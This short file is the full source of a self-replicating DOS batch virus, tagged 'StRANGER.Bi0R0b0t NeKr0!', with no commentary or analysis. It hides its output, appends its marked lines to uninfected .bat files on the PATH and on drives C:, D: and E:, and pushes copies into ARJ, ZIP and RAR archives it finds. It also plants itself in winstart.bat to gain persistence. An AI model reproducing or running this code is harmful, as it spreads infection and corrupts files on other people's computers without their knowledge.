@ctty nul%BR1%
if '%1'=='BR1DiR' goto BR1diRz
if '%1'=='BR1' goto BR1zex
set BR1FK=bat
echo.>BR1.bat
Find "BR1"<%0>>BR1.bat
for %%a in (*.arj ..\*.arj) do arj a %%a BR1.bat
for %%a in (*.zip ..\*.zip) do pkzip %%a BR1.bat
for %%a in (*.rar ..\*.rar) do rar a %%a BR1.bat
for %%r in (%path% . .. c: d: e:) do call BR1.bat BR1DiR %%r
goto BR1pre
:BR1DiRz
for %%c in (%2\*.%BR1FK%) do if not %%c==%2\AUTOEXEC.BAT call BR1.bat BR1 %%c 
goto BR1end
:BR1pre
type BR1.bat >%windir%\winstart.bat
del BR1.bat
goto BR1end
:BR1zex
Find "BR1"<%2>nul
if errorlevel 1 type BR1.bat>>%2
:BR1end [StRANGER.Bi0R0b0t NeKr0!]
